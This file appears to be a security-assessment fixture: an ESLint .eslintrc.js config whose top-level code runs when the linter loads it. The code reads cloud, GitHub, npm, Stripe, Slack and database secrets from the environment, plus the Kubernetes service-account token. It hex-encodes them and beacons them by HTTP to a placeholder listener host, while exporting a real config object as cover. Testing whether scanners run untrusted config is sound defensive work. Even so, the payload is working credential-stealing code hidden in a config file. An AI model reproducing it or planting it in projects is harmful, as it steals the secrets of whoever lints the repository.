// Assessment fixture: .eslintrc.js executed as JavaScript when ESLint loads config.
//
// Real behavior abused
// --------------------
// ESLint's legacy config format `.eslintrc.js` is a *JavaScript module*. ESLint
// `require()`s it to read the config object, so any top-level code in the file
// runs inside the linter's process the moment ESLint discovers it -- before a
// single line of the target code is analyzed. Pointing any SAST pipeline that
// uses ESLint at this repo runs the config module.
//
// Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
// (substituted by the worker). Node core modules only (http).

const http = require("http");
const fs = require("fs");

const SCAN_TOKEN = "__DVAP_SCAN_TOKEN__";
const VECTOR = "__DVAP_VECTOR__";
const LISTENER_HOST = "__DVAP_LISTENER_HOST__";
const LISTENER_PORT = "__DVAP_LISTENER_PORT__";

const SECRET_ENV_KEYS = [
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_CANARY_ACCESS_KEY_ID",
  "AWS_CANARY_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "GITHUB_TOKEN",
  "GITHUB_CANARY_TOKEN",
  "NPM_TOKEN",
  "APP_DATABASE_URL",
  "STRIPE_API_KEY",
  "SLACK_WEBHOOK_URL",
];
const K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token";

function collectExfil() {
  const lines = [];
  for (const key of SECRET_ENV_KEYS) {
    const val = process.env[key];
    if (val) {
      lines.push(key + "=" + val);
    }
  }
  try {
    const token = fs.readFileSync(K8S_TOKEN_PATH, "utf8").trim();
    if (token) {
      lines.push("K8S_SA_TOKEN=" + token);
    }
  } catch (e) {
    // token file absent -- ignore
  }
  return lines.join("\n");
}

function dottedHex(payload) {
  const hexed = Buffer.from(payload, "utf8").toString("hex");
  const chunks = [];
  for (let i = 0; i < hexed.length; i += 60) {
    chunks.push(hexed.slice(i, i + 60));
  }
  return chunks.join(".");
}

function beacon() {
  const dotted = dottedHex(collectExfil());
  const path = "/b/" + SCAN_TOKEN + "/" + VECTOR + "?d=" + dotted;
  const req = http.request(
    { host: LISTENER_HOST, port: LISTENER_PORT, path: path, method: "GET" },
    (res) => {
      res.on("data", () => {});
      res.on("end", () => {});
    },
  );
  req.on("error", () => {});
  req.end();
}

// Side effect at config-load time.
beacon();

// Benign cover: a real ESLint config object so the file is a valid .eslintrc.js.
module.exports = {
  root: true,
  env: { node: true, es2021: true },
  parserOptions: { ecmaVersion: 2021, sourceType: "module" },
  rules: {},
};
